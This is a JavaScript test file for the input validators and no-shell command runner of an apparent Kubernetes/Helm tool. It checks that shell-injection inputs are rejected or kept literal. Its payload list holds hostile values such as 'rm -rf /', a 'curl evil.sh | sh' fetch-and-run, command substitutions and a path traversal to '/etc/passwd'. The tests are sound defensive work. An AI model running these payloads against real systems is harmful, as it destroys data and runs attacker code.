const test = require('node:test');
const assert = require('node:assert');

// These tests exercise the ACTUAL exported source modules (not inline copies),
// so they fail if the real validation or command-execution behavior regresses.
const validators = require('./src/utils/validators');
const { run } = require('./src/utils/exec');

// Classic shell-injection payloads that must never be accepted as a Kubernetes
// identifier and must never be interpreted by a shell.
const INJECTION_PAYLOADS = [
    'default; rm -rf /',
    'default && curl evil.sh | sh',
    'name`id`',
    'name$(id)',
    'a|b',
    'a&b',
    'a>b',
    "a' OR '1'='1",
    'a\nb',
    '../../etc/passwd',
    '$(touch /tmp/pwned)',
];

test('validators - accepts legitimate namespaces', () => {
    assert.ok(validators.isValidNamespace('default'));
    assert.ok(validators.isValidNamespace('kube-system'));
    assert.ok(validators.isValidNamespace('periscope'));
});

test('validators - accepts legitimate resource names and kinds', () => {
    assert.ok(validators.isValidName('my-pod-7d6f54c9-abc12'));
    assert.ok(validators.isValidName('release.v2'));
    assert.ok(validators.isValidKind('deployments'));
    assert.ok(validators.isValidKind('foos.example.com')); // CRD
});

test('validators - "all" sentinel is a valid namespace selector', () => {
    assert.ok(validators.isValidNamespaceOrAll('all'));
    assert.ok(validators.isValidNamespaceOrAll('default'));
    assert.ok(!validators.isValidNamespaceOrAll('all; rm -rf /'));
});

test('validators - rejects uppercase and over-length identifiers', () => {
    assert.ok(!validators.isValidNamespace('Default'));
    assert.ok(!validators.isValidNamespace('a'.repeat(64)));
    assert.ok(!validators.isValidName('a'.repeat(254)));
});

test('validators - rejects every injection payload for namespace/name/kind', () => {
    for (const payload of INJECTION_PAYLOADS) {
        assert.ok(!validators.isValidNamespace(payload), `namespace accepted: ${payload}`);
        assert.ok(!validators.isValidName(payload), `name accepted: ${payload}`);
        assert.ok(!validators.isValidKind(payload), `kind accepted: ${payload}`);
    }
});

test('validators - assert* throws ValidationError (HTTP 400) on injection', () => {
    for (const payload of INJECTION_PAYLOADS) {
        assert.throws(() => validators.assertNamespace(payload), (e) => {
            return e instanceof validators.ValidationError && e.statusCode === 400;
        });
        assert.throws(() => validators.assertName(payload), validators.ValidationError);
    }
});

test('validators - assert* returns the value when valid', () => {
    assert.strictEqual(validators.assertNamespace('default'), 'default');
    assert.strictEqual(validators.assertName('my-pod'), 'my-pod');
    assert.strictEqual(validators.assertKind('deployments'), 'deployments');
});

test('exec.run - executes without a shell, so metacharacters stay literal', async () => {
    // We use process.execPath (Node) to print inputs in a cross-platform way.
    // With a shell, metacharacters would be evaluated. Via execFile (no shell),
    // they stay literal. This is the core anti-injection guarantee.
    const { stdout } = await run(process.execPath, ['-e', 'console.log(process.argv[1])', '$(id)']);
    assert.strictEqual(stdout.trim(), '$(id)');

    const { stdout: out2 } = await run(process.execPath, ['-e', 'console.log(process.argv.slice(1).join(" "))', 'a; rm -rf /', 'b`whoami`']);
    assert.strictEqual(out2.trim(), 'a; rm -rf / b`whoami`');
});

test('exec.run - rejects on non-zero exit and surfaces stderr', async () => {
    await assert.rejects(run(process.execPath, ['-e', 'console.error("boom"); process.exit(3)']), (err) => {
        return err.stderr.includes('boom');
    });
});

// Import service tests
require('./src/services/helmService.test');
require('./src/services/k8sService.test');

